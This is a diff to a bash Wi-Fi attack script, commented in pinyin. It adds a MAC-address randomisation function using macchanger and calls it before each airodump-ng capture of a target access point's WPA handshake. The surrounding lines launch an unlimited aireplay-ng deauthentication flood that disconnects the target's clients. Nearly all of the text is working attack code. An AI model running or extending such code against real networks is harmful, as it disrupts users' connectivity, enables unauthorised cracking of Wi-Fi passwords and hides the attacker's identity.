@@ -208,6 +208,15 @@ fi
 }
 
 #===========================================================================================================================================
+#============================                          xiu gai wlan car mac addr function                        ===========================
+#===========================================================================================================================================
+changer_mac_addr() {
+ip link set ${wlan_card} down >/dev/null 2>&1
+macchanger -r ${wlan_card} >/dev/null 2>&1
+ip link set ${wlan_card} up >/dev/null 2>&1
+}
+
+#===========================================================================================================================================
 #=====================                                  handshake 2.4g and 5g function                              ========================
 #===========================================================================================================================================
 handshake_bga() {
@@ -271,6 +280,7 @@ if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
 	do
 		rm -rf ${result_dir}/${target_mac//:/-}*
 		sleep 2
+		changer_mac_addr
 		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
 		echo $! >${work_dir}/airodump-ng.pid
 		sleep 2
@@ -282,6 +292,7 @@ else
 	do
 		rm -rf ${result_dir}/${target_ap_name}-${target_mac//:/-}*
 		sleep 2
+		changer_mac_addr
 		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_ap_name}-${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
 		echo $! >${work_dir}/airodump-ng.pid
 		sleep 2
@@ -290,7 +301,7 @@ fi
 
 #kai qi gon ji aireplay-ng xterm
 iw dev ${wlan_card} set channel ${cur_channel} >/dev/null 2>&1
-xterm -geometry "71+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e aireplay-ng -0 0 -a ${target_mac} --ignore-negative-one ${wlan_card} &
+xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e aireplay-ng -0 0 -a ${target_mac} --ignore-negative-one ${wlan_card} &
 echo $! >${work_dir}/aireplay-ng.pid
 
 #shu chu cao zuo ti shi info
